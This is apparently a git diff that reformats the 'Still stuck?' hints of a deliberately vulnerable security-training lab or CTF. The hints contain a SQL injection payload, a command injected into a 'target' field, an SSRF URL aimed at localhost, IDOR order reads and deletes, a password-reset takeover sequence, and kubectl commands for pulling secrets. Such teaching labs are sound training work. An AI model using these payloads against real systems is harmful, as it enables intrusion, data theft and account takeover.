@@ -27,9 +27,10 @@ Your goal: **exploit runtime vulnerabilities and escape**. No solutions are give
 
   <details>
     <summary>Still stuck?</summary>
-    Did you try: 
+    Did you try:
 
-    POST {{baseUrl}}/job/add_operations?amount=<<amount>
+   >POST {{baseUrl}}/job/add_operations?amount="amount"
+  
   </details>
 </details>
 
@@ -70,7 +71,7 @@ Your goal: **exploit runtime vulnerabilities and escape**. No solutions are give
     <summary>Still stuck?</summary>
     Try 
 
-    > GET /orders/206. 
+   > GET /orders/206. 
 
 Then look at the `username` field.
   </details>
@@ -90,9 +91,9 @@ Then look at the `username` field.
 
   <details>
     <summary>Still stuck?</summary>
-    Try:
-
-    DELETE {{baseUrl}}/orders/206
+    Try 
+    
+   > DELETE {{baseUrl}}/orders/206 
 
   </details>
 </details>
@@ -111,13 +112,19 @@ Then look at the `username` field.
 
   <details>
     <summary>Still stuck?</summary>
-    
-    POST /auth/reset-password
-    { "username": "smith" }
+
+   > POST /auth/reset-password
+   
+   with payload:
+   > { "username": "smith" }
+
 Then:
     
-    POST /auth/change-password
-    {
+   > POST /auth/change-password
+    
+   with payload
+   
+   > {
       "username": "user",
       "otp": "xyz",
       "new_password": "newpass"
@@ -143,7 +150,7 @@ Use a runner or script to iterate all combinations.
     <summary>Still stuck?</summary>
 Payload:
 
-    { "username": "user1' OR '1'='1" }
+  >  { "username": "user1' OR '1'='1" }
  
 Response will expose app logs and CLI startup script.
   </details>
@@ -165,7 +172,7 @@ Response will expose app logs and CLI startup script.
     <summary>Still stuck?</summary>
 Try:
 
-    http://127.0.0.1:8001/app/users.json
+  >  http://127.0.0.1:8001/app/users.json
 
 as your new profile image URL.
   </details>
@@ -187,7 +194,7 @@ as your new profile image URL.
     <summary>Still stuck?</summary>
     Example:
 
-    { "target": "localhost && ps aux | grep <<username>>" }
+  >  { "target": "localhost && ps aux | grep <<username>>" }
 
   </details>
 </details>
@@ -208,9 +215,11 @@ as your new profile image URL.
     <summary>Still stuck?</summary>
     Sequence:
 
-    kubectl get pods
-    kubectl exec pod-name -- get secrets
-    kubectl exec pod-name -- last command
+  >  kubectl get pods
+
+  >  kubectl exec pod-name -- get secrets
+  
+  >  kubectl exec pod-name -- last command
 
   </details>
 </details>
